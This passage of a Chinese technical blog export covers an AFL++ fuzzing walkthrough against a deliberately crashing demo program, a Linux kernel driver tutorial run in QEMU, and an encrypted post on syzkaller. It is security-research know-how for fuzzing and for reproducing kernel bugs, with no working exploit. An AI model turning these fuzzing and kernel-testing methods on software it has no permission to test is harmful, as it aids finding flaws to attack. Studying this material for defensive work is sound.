因为冗余而过大肯定会导致大量不必要的资源开销。因此，如何在保证检测效果不变的情况下尽可能地缩小
seed pool，是非常经典的问题。而这一问题被研究者们用数学建模出来，提出了
MSCP 问题。相关算法的细节我仍未了解，此处不具体展开。</p>
<h3 id="predict-energy">[1-5-2] Predict Energy</h3>
<p>给每个 seed 赋予的初始 energy 应该是多少？一个 testcase 的 fitness
对应的 energy 应该是多少？这样的问题可以通过 Markov Chain, WCCP 和 ILP
问题来建模解决。</p>
<h3 id="snapshot">[1-5-3] SnapShot</h3>
<p>每次从 0
开始启动程序肯定会带来大量不必要的开销。如果我们可以从程序的某一状态开始，布置好程序所需的环境，即可大量减少程序启动带来的开销。</p>
<h3 id="triage">[1-5-4] Triage</h3>
<p>minimize payload / deduplicate / exploitable / understandability</p>
<h2 id="应用场景">[1-6] 应用场景</h2>
<p><strong>Black-Box</strong></p>
<p><strong>Grey-Box</strong></p>
<p><strong>White-Box</strong></p>
<h1 id="afl-plus-plus-使用">[2] AFL plus plus 使用</h1>
<blockquote>
<p>OS: Windows11 24H2 - WSL2 ubuntu2204 CPU: 12th Gen Intel(R) Core(TM)
i5-12500H 2.50 GHz</p>
</blockquote>
<p>docker 和 本地编译都可以见<a
href="https://github.com/AFLplusplus/AFLplusplus?tab=readme-ov-file#building-and-installing-afl">github
readme</a>，用 docker 就能安装</p>
<p>分给 WSL 的 8MB 大概编译了 1h 左右</p>
<h2 id="有源码-demo-运行">[2-1] 有源码 demo 运行</h2>
<p>参考<a
href="https://github.com/alex-maleno/Fuzzing-Module#how-to-run-afl-on-exercise-1">官方
tutorial</a> 、<a
href="https://f0cus7.github.io/2022/05/14/fuzz-%E9%80%9A%E8%BF%87afl-training%E5%AD%A6%E4%B9%A0afl/">focus7的博客</a>
、<a href="https://tttang.com/archive/1595/">跳跳糖的博客</a> 、<a
href="http://ba1100n.tech/binary_security/fuzzing%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90%E4%B8%8A%EF%BC%9Aafl%EF%BC%8Cafl%E8%83%8C%E5%90%8E%E7%9A%84%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95/">ba1100n的博客</a></p>
<h3 id="获取目标源文件并编译">[2-1-1] 获取目标源文件并编译</h3>
<p>我们可以编写一个有问题的程序 simple_crash.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// simple_crash.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   string str;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;enter input string: &quot;</span>;</span><br><span class="line">   <span class="built_in">getline</span>(cin, str);</span><br><span class="line">   cout &lt;&lt; str &lt;&lt; endl &lt;&lt; str [<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="number">0</span> || str[str.<span class="built_in">length</span>() - <span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> prev_num = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (count != str.<span class="built_in">length</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">char</span> c = str[count];</span><br><span class="line">            <span class="keyword">if</span>(c &gt;= <span class="number">48</span> &amp;&amp; c &lt;= <span class="number">57</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(c == prev_num + <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">abort</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                prev_num = c;</span><br><span class="line">            &#125; </span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写编译这个 cpp 文件的 CMakeLists.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">project(simple_crash)</span><br><span class="line">add_executable(simple_crash simple_crash.cpp)</span><br></pre></td></tr></table></figure>
<p>接着编译文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
<h3 id="初始化-seed-pool">[2-1-2] 初始化 seed pool</h3>
<p>然后初始化 seed pool, 即 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir input</span><br><span class="line">cd input</span><br><span class="line">for i in &#123;0..4&#125;; do dd if=/dev/urandom of=seed_$i bs=64 count=10; done</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure></p>
<p>然后使用<code>afl-fuzz -i input -o output -- ./build/simple_crash</code>启动
fuzz 即可</p>
<h2 id="分析-crashes">[2-2] 分析 crashes</h2>
<p>可以遍历 <code>output/default/crashes</code> 里的文件来查看导致
crashes 的输入，通过 gdb 等调试文件可以看到在哪里出现了问题。</p>
<h1 id="xfe-参考文献">[0xFE] 参考文献</h1>
<p>[1] V. J. M. Manès et al., "The Art, Science, and Engineering of
Fuzzing: A Survey," in IEEE Transactions on Software Engineering, vol.
47, no. 11, pp. 2312-2331, 1 Nov. 2021, doi:
10.1109/TSE.2019.2946563.</p>
<p>[2] Xiaogang Zhu, Sheng Wen, Seyit Camtepe, and Yang Xiang. 2022.
Fuzzing: A Survey for Roadmap. ACM Comput. Surv. 54, 11s, Article 230
(January 2022), 36 pages. https://doi.org/10.1145/3512345</p>
<p>[3] Li, J., Zhao, B. &amp; Zhang, C. Fuzzing: a survey. Cybersecur 1,
6 (2018). https://doi.org/10.1186/s42400-018-0002-y</p>
]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel - 浅析 kernel drivers 与简单实操</title>
    <url>/posts/25823.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
梳理一下近日 linux kernel drivers 的内容
</blockquote>
<span id="more"></span>
<p>本人使用的环境为：</p>
<p>OS: WSL2 ubuntu2204 12GB 16线程</p>
<p>QEMU:</p>
<h1 id="实操-demo运行与工作流搭建">[1] 实操-Demo运行与工作流搭建</h1>
<h2 id="如何用-qemu-跑一个简单-demo">[1-1] 如何用 QEMU 跑一个简单
demo</h2>
<h3 id="安装-qemu-与准备-root-文件系统">[1-1-1] 安装 QEMU 与准备 root
文件系统</h3>
<p>下载 QEMU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-system-x86</span><br></pre></td></tr></table></figure>
<p>准备文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 BusyBox 并编译</span></span><br><span class="line">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2</span><br><span class="line">tar -xf busybox-1.36.1.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.36.1</span><br><span class="line">make menuconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置，选中如下项目，静态编译</span></span><br><span class="line"><span class="comment"># Settings –&gt; Build Options –&gt; [*] Build static binary（no share libs）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反选如下项目，否则后续qemu执行会提示 /bin/sh:can&#x27;t access tty;job control turned off</span></span><br><span class="line"><span class="comment"># Shells  ---&gt;  [ ]   Job control</span></span><br><span class="line"></span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br><span class="line"><span class="comment"># 打包成 initramfs</span></span><br><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line"><span class="built_in">mkdir</span> -p proc sys tmp etc dev</span><br><span class="line"><span class="built_in">mkdir</span> -p mnt/hostshare</span><br><span class="line"><span class="built_in">touch</span> init</span><br><span class="line"><span class="built_in">chmod</span> +x init</span><br></pre></td></tr></table></figure>
<p>init 文件中内容为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载一些必要的文件系统</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t 9p -o trans=virtio hostshare /mnt/hostshare <span class="comment"># 用于挂载</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello Linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示开机消耗时间</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;This boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停留在控制台</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br></pre></td></tr></table></figure>
<p>然后打包成 initramfs.cpio.gz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
<h3 id="准备-kernel">[1-1-2] 准备 kernel</h3>
<p>安装依赖项（可能还会需要其他依赖，如果遇到报错请自行 gpt）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y libssl-dev libelf-dev</span><br></pre></td></tr></table></figure>
<p>记得不要在 wsl 的挂载目录下编译，可能会导致时钟误判</p>
<p>安装源代码并编译，我的设备大概编译了五六分钟</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> kvm</span><br><span class="line"><span class="built_in">cd</span> kvm</span><br><span class="line">wget https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/snapshot/linux-6.12.15.tar.gz</span><br><span class="line">tar -xf linux-6.12.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> linux-6.12.15</span><br><span class="line">make defconfig</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>
<h3 id="仿真">[1-1-3] 仿真</h3>
<p>以字符界面方式启动QEMU（不启动图形界面），同时日志输出到控制台：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -append <span class="string">&quot;init=/init console=ttyS0&quot;</span> \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<h3 id="demo-driver-测试">[1-1-4] demo driver 测试</h3>
<p>在刚才用于编译 kernel 的内核源码库中，找到 drivers 文件夹，在
xxx/linux/drivers（比如我这里就是~/kvm/linux/drivers） 下创建 mydriver
仓库，编写 hello.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;HeyGap&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;A simple hello world module&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在同目录下编写 Makefile，注意替换 <code>~/kvm/linux</code>
为你自己的内核源码库目录</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">KDIR := ~/kvm/linux</span><br><span class="line"></span><br><span class="line">obj-m += hello.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p>用 <code>make</code> 编译即可产生 hello.ko</p>
<p>然后将 mydriver 目录挂载到 QEMU 中的 /mnt/shared 目录下</p>
<blockquote>
<p>注：由于在制作 initramfs 的 init
文件时已经加入了挂载命令，因此此处只需要让 qemu 挂载启动即可</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">  -initrd initramfs.cpio.gz \</span><br><span class="line">  -nographic \</span><br><span class="line">  -virtfs <span class="built_in">local</span>,path=/home/heygap/kvm/linux/drivers/mydriver,security_model=none,mount_tag=hostshare</span><br></pre></td></tr></table></figure>
<p>启动后，使用命令<code>insmod hello.ko</code>和<code>rmmod hello</code>即可装载或卸载内核模块，在
insmod 后也可以通过 lsmod 来查看是否加载模块的信息。</p>
<p><img src="/source/pic/kernel/QEMU模拟ubuntu1.png" /></p>
<h2 id="如何切换旧版本的-kernel">[1-2] 如何切换旧版本的 kernel?</h2>
<p>考虑到复现不同的 CVE 可能需要不同的 kernel 版本，不同的 kernel
又需要不同版本的工具链，因此我考虑用 docker
去专门做一个用于编译内核的容器。</p>
<p>所需工具链的版本可以从 linux/Documentation/Changes
这个文件里看，如何切换旧版本的源可以看<a
href="https://blog.csdn.net/CharlieVV/article/details/111242143">这篇</a>，中科大旧ubuntu发行版本<a
href="https://mirrors.ustc.edu.cn/ubuntu-old-releases/releases/">源</a></p>
<p>切换到旧版本之后就可以让 gpt
生成一条长命令一键安装所有工具了，然后按[1-1-2]所说的编译即可。</p>
<p>最后再通过 <code>docker cp</code> 命令把内核拷贝到宿主机即可。</p>
<h1 id="理论内容-基础知识">[2] 理论内容-基础知识</h1>
<h2 id="linux-kernel-drivers-简介">[2-1] linux kernel drivers 简介</h2>
<p>在 Linux 内核中，驱动程序（Device
Driver）通常可以分为以下几大类：</p>
<table>
<thead>
<tr class="header">
<th>驱动类型</th>
<th>典型设备</th>
<th>主要接口</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>字符设备</strong></td>
<td>串口、键盘、随机数设备</td>
<td><code>register_chrdev()</code></td>
</tr>
<tr class="even">
<td><strong>块设备</strong></td>
<td>硬盘、SD 卡</td>
<td><code>register_blkdev()</code></td>
</tr>
<tr class="odd">
<td><strong>网络设备</strong></td>
<td>以太网卡、WiFi</td>
<td><code>register_netdev()</code></td>
</tr>
<tr class="even">
<td><strong>设备总线</strong></td>
<td>PCI、I2C、USB</td>
<td><code>bus_register()</code></td>
</tr>
<tr class="odd">
<td><strong>文件系统</strong></td>
<td>ext4、NFS</td>
<td><code>register_filesystem()</code></td>
</tr>
<tr class="even">
<td><strong>虚拟设备</strong></td>
<td>RAM 盘、Loop 设备</td>
<td>依赖具体类型</td>
</tr>
<tr class="odd">
<td><strong>中断驱动</strong></td>
<td>传感器、键盘</td>
<td><code>request_irq()</code></td>
</tr>
<tr class="even">
<td><strong>电源管理</strong></td>
<td>CPU 省电模式</td>
<td><code>pm_runtime_enable()</code></td>
</tr>
<tr class="odd">
<td><strong>图形驱动</strong></td>
<td>NVIDIA/AMD GPU</td>
<td><code>drm_driver</code></td>
</tr>
<tr class="even">
<td><strong>声音驱动</strong></td>
<td>声卡、麦克风</td>
<td><code>ALSA API</code></td>
</tr>
</tbody>
</table>
<h2 id="建立和运行">[2-2] 建立和运行</h2>
<h3 id="编译和加载">[2-2-1] 编译和加载</h3>
<p>编译配置文档在 Linux 源码的 document/kbuild/ 目录下，所需的工具版本在
document/changes 这一文件中</p>
<p>/var/log/message
下可能会存储模块无法加载的问题。内核接口在不同发行版本之间差别较大，如果想适配多个内核版本，需要用宏定义和ifdef来正常运行。
或者通过头文件 linux/module.h 来设置内核版本</p>
<h3 id="内核符号表与模块堆叠">[2-2-2] 内核符号表与模块堆叠</h3>
<p>modprobe 工具可以加载任何模块所需的其他模块，所以一次 modprobe
命令可能代替几次使用 insmod</p>
<p>如果模块需要输出符号给其他模块使用，可以用 EXPORT_SYMBOL(name); 和
EXPORT_SYMBOL_GPL(name);</p>
<h3 id="预备代码">[2-2-3] 预备代码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 为了获取全局函数、数据结构和变量的定义，我们需要加载这些头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span> <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 模块代码主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块末尾</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); <span class="comment">// 许可等 MODULE_ 声明</span></span><br></pre></td></tr></table></figure>
<h3 id="初始化与退出">[2-2-4] 初始化与退出</h3>
<p>初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. static: 初始化代码应当是静态的，因为它们一般不会输出给内核的其他部分</span></span><br><span class="line"><span class="comment">// 2. __init 或 __initdata: 可选，让内核知道给定的函数只在初始化时使用</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">initialization_function</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 初始化代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">module_init(initialization_function);</span><br></pre></td></tr></table></figure>
<p>退出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 没有返回值</span></span><br><span class="line"><span class="comment">// 2. __exit 表示只用于卸载模块</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">cleanup_function</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 清理代码</span></span><br><span class="line">&#125;</span><br><span class="line">module_exit(cleanup_function);</span><br></pre></td></tr></table></figure>
<p>错误处理：首先，在出错之后模块尽可能还能运行，只是少了一些功能；如果实在无法运行，内核需要回滚到注册之前的状态，比如释放指针等操作。
错误恢复经常用 goto 代码，并且使每个函数尽可能精简且流水，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sth</span> *<span class="title">p1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sthelse</span> *<span class="title">p2</span>;</span></span><br><span class="line"><span class="type">int</span> stuff_ok;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(stuff_ok) unregister_stuff();</span><br><span class="line">  <span class="keyword">if</span>(p2) release_stuff2(p2, <span class="string">&quot;skull&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p1) release_stuff1(p1, <span class="string">&quot;skull&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">initialize</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> err = -ENOMEM;</span><br><span class="line">  p1 = allocate_thing(arg1);</span><br><span class="line">  p2 = allocate_thing2(arg2);</span><br><span class="line">  <span class="keyword">if</span> ((!p1) || (!p2)) <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">  err = register_stuff1(p1, <span class="string">&quot;skull&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(err) <span class="keyword">goto</span> fail;</span><br><span class="line">  err = register_stuff2(p2, <span class="string">&quot;skull&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(err) <span class="keyword">goto</span> fail;</span><br><span class="line">  stuff_ok = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  cleanup();</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果需要的话，可以引入 <code>&lt;linux/errno.h&gt;</code>
来使用符号式的返回值。</p>
<h3 id="模块参数">[2-2-5] 模块参数</h3>
<p>通过 module_param 宏，我们可以让模块接收参数运行。该宏定义在
moduleparam.h，并且有三个参数：变量名、类型和权限掩码(用于做辅助的 sysfs
入口?),
模块参数支持的数据类型有:bool,invbool,charp,int,uint,long,short,ulong,ushort,
应用如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/stat.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *whom = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> howmany = <span class="number">1</span>;</span><br><span class="line">module_param(whom, charp, S_IRUGO);</span><br><span class="line">module_param(howmany, <span class="type">int</span>, S_IRUGO);</span><br></pre></td></tr></table></figure>
<p>我们可以通过给予 insmod/modprobe
参数的方式来让模块带参数运行，比如<code>insmod helloparam whom="heygap" howmany=5</code></p>
<p>该宏定义也允许我们提供数组参数：<code>module_param_array(name, type, num, perm)</code>，值得注意的是，如果数组参数在加载时设置，num
会被设置成提供的数的个数，
但加载比声明多的数会报错。同时，我们也可以自定义数据类型。</p>
<p>对于权限掩码 perm，我们应该使用 <code>&lt;linux/stat.h&gt;</code>
中的值，如果 perm 被设置为0，则说明没有 sysfs 项，否则会出现在
sys/module 下，S_IRUGO 允许所有人读取但不能写， S_IRUGO|S_IWUSR 允许
root 改变参数</p>
<h3 id="其他">[2-2-6] 其他</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span> <span class="comment">// 包含内核 API 的定义，包括 sleep 函数及许多变量的声明</span></span></span><br></pre></td></tr></table></figure>
<h1 id="字符设备">[3] 字符设备</h1>
<h2 id="主次设备号">[3-1] 主次设备号</h2>
<p>我们知道 linux
中一切对象都是文件，而字符设备通过文件系统中的文件名来读写，它们存放在
/dev 目录中。运行 ls -l
时会发现原来文件长度出现的地方现在被两个数字取代了，第一个数字是主编号，第二个数字是次编号。主编号用于标识一类设备，次编号用于标识这类设备中某一特定的设备。用电话号码来比喻，主编号就是
+86，此编号就是我们的个人电话号码。如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crw------- 1 root root    229,   0 Feb 25 15:50 hvc0</span><br><span class="line">crw--w---- 1 root <span class="built_in">tty</span>     229,   1 Feb 25 15:35 hvc1</span><br><span class="line">crw------- 1 root root    229,   2 Feb 25 15:50 hvc2</span><br><span class="line">crw------- 1 root root    229,   3 Feb 25 15:35 hvc3</span><br><span class="line">crw------- 1 root root    229,   4 Feb 25 15:35 hvc4</span><br><span class="line">crw------- 1 root root    229,   5 Feb 25 15:35 hvc5</span><br><span class="line">crw------- 1 root root    229,   6 Feb 25 15:35 hvc6</span><br><span class="line">crw------- 1 root root    229,   7 Feb 25 15:35 hvc7</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel - syskaller</title>
    <url>/posts/65231.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1050c76082395e9c0adc40fd8772c226c42c85290a2eb1bc32fffb02596f4eb9">135c5447cb00e71fad811ebd10e9b8edf751c7992d894491313790d0c3c6953711114dcd045237f46a3615cd0964ec59fbed9a32c79637b0c94c2e5815f7d589f7e7ba30043ea3aaf97919ee81bca33e3bf3626578867c12d86be960d802866ef81bc51c4b05b6c113455f26187c37b9d9a76a23857fd02f74d0cd4101c0df0aa1a41d48b434149e9e36417d62422b69143190bd26a2bd375bd76664bc98a1ec7412c83395287b350d0557a673d00785fad98c11e6480657c7234b895c46c46fb51ef88a56a23546cfb364059a125b66d04919f8ba272d95db5b1ca2c087e106ced1a73013cc0f219567f30e6fa70e4e1eee038a0505264f0dfe6590851bd22cb4eee447d6b17e19462fe861acd778e94a9a1d0aae959ae9ec45f195f441228e062b9390ec36e824a4d20100ce99e0d0a9e47a7978efc73db518f1739d62f74d28230e64c5bc76224e4903d927d5f7396dcb524e64153c29b3f326fac53679385d1257f1868b9d385682de1eb9aaa2ac380bd9b10b2ef26737dd29305cacfd917686c231f81169073dad94f04710d2e835269e3b8ef9abda03f0c4f3d3301bbf3ae93a91e1ae2e07cea4b5fe67f891d44ef2644e8f72b6fe542af6aa5311926e41e0d339be47a32dfca2e33ae130c35435d3c735930383a331436a20c71f5f26c3b5caef557db5dab5dad17d10e161b0901e8170e552f8eddb0f12f7875fa9bbafef6214cc0798ecdec326b61aebf51eeb06de80e36500950ca5c0af06dbc2836917bb9332b723071cd7fc5034d67bae1119b2758bf366f607b2b8282faecc3c249aa3159c6e7147da3945db45182d14c679a15633d9f3be24c684587ec31e9c91f27d7e0f2877ebd137bfda2fd6aba669809ba472dcec29e3bc9b3010b38bccd07c3458d206aa4a2261b3e64b854997aa3557028a59df1dd23704398a0379767efd779b80192ef2625bb6826f0b248caed2858c8b022bfd57525e2f7c6af22a9d79d292e5d2094b32b80acef3ca4dc150a550f07ffa5c41cf4eb4564de6467888590d57eb11b55474719ea3866c9cd51a457de1a20591921c6f759c62a53eb1ff3ce02ac5d998e3210e6c0577fb3861c0b69be666351d2c46751f4ac82ae9d3dc7247b4d14abb075cdbca7a0782f22f34eee3f02c47bb7e849974ebd3fdc8ea5fa4d64ab9310cf12c5c44936d29ae5bf6c84ed33af7f78b90fbf8e9f79cf7cb5535c67234ecbf9916c147ac70871352a141032a242faaca993d5b2294032bb2b5a13e71fbf0d88dd144b2356067aebf14cb782c4ac9e4f88510493fb9313008b2d2d021a86490e72f7a9c483e54624657eca617cc402a38d588d5e4e8d0c88f8c4112400ffe580322a4813520f61d90e71a99a82613e504c1bc41b2d64de5ec15173524d3f0e075e141a67ece9d6c70a44a8401c546a2669aa3099be176e9a1551f070450e700d1362463f901aa268abbeb78a457f39fcf2f3ac07d535922bf5d145b04613e27ff473ef2a085ab18cf86157dfc49c6580a1701297cb38e6ec8eccb8d7d3f67544f4cb384ce088f3d7d5a69adbcfb67ba5b5b39720326bd3b8dc5b196903178d63d20f44b619153c133cbe5ce232a209ca2f432565ae346bb71c1ee6ec7d5fa6818f0faf386076b8187507237e0724a2234b6d7385cc9d86363ed72582cf6b302b82f6d95477e58d4f99f5eb710a029561a49222d15c6ef17d76743853c1405f355aa463c200b959f1f6cc7bd038e8c75cf483e68f8e293ef50b9bcd2f9518338bd25e6a3da2fb2a2913c6855d096700add28c24314422696657695971c56d0a7810a110eb4c686ef5393ca661072ac73713a33c4791b53024cfef3728e3e15357ca71b360ba573f2b07143dac7bd70b4afc092d25826cf209aa100a97c9f1f62c7e135465850c7fdb1a09ae9164086a4b169852a85ce216b489e92e8348c5fc797b1993a9eee3919f10d8800c9df046824bfb2b5497588593ca46776b4002d31818bcf8b5d6b8311336fea4615677f60c3b06a179d097e145d6b069025c337b9969e96f39bd9916b1c1971716729a